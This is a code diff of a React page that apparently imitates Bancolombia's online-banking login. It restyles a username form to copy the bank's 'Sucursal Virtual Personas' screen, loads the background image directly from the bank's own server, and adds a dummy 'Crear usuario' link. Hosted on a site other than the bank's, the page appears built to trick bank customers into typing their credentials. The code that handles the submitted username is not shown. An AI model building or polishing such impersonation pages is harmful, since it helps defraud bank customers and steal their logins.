@@ -51,107 +51,103 @@ export default function BancolombiaUsuarioPage() {
   };
 
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center p-4 relative overflow-hidden">
-      {/* Decorative arcs */}
-      <div className="absolute top-0 left-0 w-full h-full pointer-events-none overflow-hidden">
-        <svg className="absolute -top-32 -left-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
-          <path d="M-20 380 Q 150 200 320 380" stroke="#FF6B35" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M-10 390 Q 160 210 330 390" stroke="#FFA500" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M0 400 Q 170 220 340 400" stroke="#FFD700" strokeWidth="40" fill="none" opacity="0.4"/>
-        </svg>
-        <svg className="absolute -bottom-32 -right-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
-          <path d="M420 20 Q 250 200 80 20" stroke="#9333EA" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M410 10 Q 240 190 70 10" stroke="#F59E0B" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M400 0 Q 230 180 60 0" stroke="#EF4444" strokeWidth="40" fill="none" opacity="0.4"/>
-        </svg>
-      </div>
-
-      <div className="max-w-lg w-full relative z-10">
-        {/* Header */}
-        <div className="text-center mb-8">
-          <img 
-            src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
-            alt="Bancolombia" 
-            className="h-6 mx-auto mb-6 object-contain"
-          />
-          <button
-            onClick={handleCancel}
-            className="absolute top-0 right-0 text-gray-600 hover:text-gray-800"
-          >
-            Salir →
-          </button>
-        </div>
-
-        {/* Form */}
-        <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
-          <div className="text-center mb-8">
-            <h2 className="text-3xl font-bold text-gray-900 mb-3">Te damos la bienvenida</h2>
-            <p className="text-gray-600 text-sm">
-              El usuario es el mismo con el que ingresas a la<br />
-              <span className="font-semibold">Sucursal Virtual Personas</span>.
-            </p>
+    <div className="min-h-screen bg-gray-50 relative">
+      {/* Background with auth-trazo image */}
+      <div 
+        className="min-h-screen bg-no-repeat bg-center bg-cover"
+        style={{
+          backgroundImage: `url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg')`
+        }}
+      >
+        <div className="container mx-auto px-4 py-8">
+          {/* Header with logo */}
+          <div className="flex justify-center mt-12 mb-8">
+            <img 
+              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
+              alt="Bancolombia" 
+              className="h-12 object-contain"
+            />
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-6">
-            <div>
-              <div className="flex items-center space-x-2 mb-3">
-                <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-                </svg>
-                <label htmlFor="usuario" className="text-sm font-medium text-gray-700">
-                  Usuario
-                </label>
+          {/* Title */}
+          <h1 className="text-center text-gray-600 text-lg font-light mb-12">
+            Sucursal Virtual Personas
+          </h1>
+
+          {/* Form Container */}
+          <div className="flex justify-center">
+            <div className="w-full max-w-md">
+              {/* Card */}
+              <div className="bg-white rounded-xl shadow-lg p-8">
+                <div className="text-center mb-6">
+                  <h2 className="text-2xl font-bold text-gray-900 mb-3">¡Hola!</h2>
+                  <p className="text-gray-600 text-sm">
+                    Ingresa los datos para gestionar tus productos y hacer transacciones.
+                  </p>
+                </div>
+
+                <form onSubmit={handleSubmit} className="space-y-6">
+                  <div className="relative">
+                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
+                      <svg className="w-5 h-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
+                      </svg>
+                    </div>
+                    <input
+                      type="text"
+                      id="usuario"
+                      value={usuario}
+                      onChange={(e) => setUsuario(e.target.value)}
+                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition text-base"
+                      placeholder="Usuario"
+                      disabled={loading}
+                      autoFocus
+                      autoComplete="username"
+                    />
+                    <label className="absolute left-10 top-3 text-gray-400 text-sm pointer-events-none">
+                      Usuario
+                    </label>
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={!usuario.trim() || loading}
+                    className="w-full py-3 px-6 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
+                  >
+                    {loading ? (
+                      <span className="flex items-center justify-center">
+                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                        Validando...
+                      </span>
+                    ) : (
+                      'Iniciar sesión'
+                    )}
+                  </button>
+                </form>
+
+                <div className="text-center mt-6">
+                  <button
+                    onClick={handleCancel}
+                    className="text-blue-600 hover:text-blue-700 underline text-sm"
+                  >
+                    Crear usuario
+                  </button>
+                </div>
               </div>
-              <input
-                type="text"
-                id="usuario"
-                value={usuario}
-                onChange={(e) => setUsuario(e.target.value)}
-                className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400 outline-none transition text-base"
-                placeholder="Ingresa tu usuario"
-                disabled={loading}
-                autoFocus
-                autoComplete="username"
-              />
             </div>
+          </div>
 
-            <div className="flex space-x-3">
-              <button
-                type="button"
-                onClick={handleCancel}
-                className="flex-1 py-3.5 px-6 bg-white border-2 border-gray-300 text-gray-700 rounded-full hover:bg-gray-50 transition disabled:opacity-50 font-medium"
-                disabled={loading}
-              >
-                Volver
-              </button>
-              <button
-                type="submit"
-                disabled={!usuario.trim() || loading}
-                className="flex-1 py-3.5 px-6 bg-[#FDDA24] text-gray-900 rounded-full hover:bg-[#FED500] disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
-              >
-                {loading ? (
-                  <span className="flex items-center justify-center">
-                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    Validando...
-                  </span>
-                ) : (
-                  'Continuar'
-                )}
-              </button>
-            </div>
-          </form>
-        </div>
-
-        {/* Footer Logo */}
-        <div className="text-center mt-8">
-          <img 
-            src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
-            alt="Bancolombia" 
-            className="h-5 mx-auto opacity-60"
-          />
+          {/* Footer Logo */}
+          <div className="text-center mt-12">
+            <img 
+              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
+              alt="Bancolombia" 
+              className="h-6 mx-auto opacity-60"
+            />
+          </div>
         </div>
       </div>
     </div>
